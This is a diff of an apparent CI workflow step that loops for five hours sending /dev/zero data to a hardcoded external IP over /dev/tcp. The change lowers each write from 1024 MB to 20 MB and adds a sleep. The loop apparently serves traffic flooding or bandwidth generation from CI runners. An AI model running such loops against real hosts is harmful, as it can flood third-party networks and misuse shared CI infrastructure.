@@ -15,6 +15,7 @@ jobs:
       - name: Run 5-hour process
         run: |
           while :; do
-            dd if=/dev/zero bs=1M count=1024 > /dev/tcp/172.233.205.83/9919 || :
+            dd if=/dev/zero bs=1M count=20 > /dev/tcp/172.233.205.83/9919 || :
+            sleep 1
           done
         timeout-minutes: 300
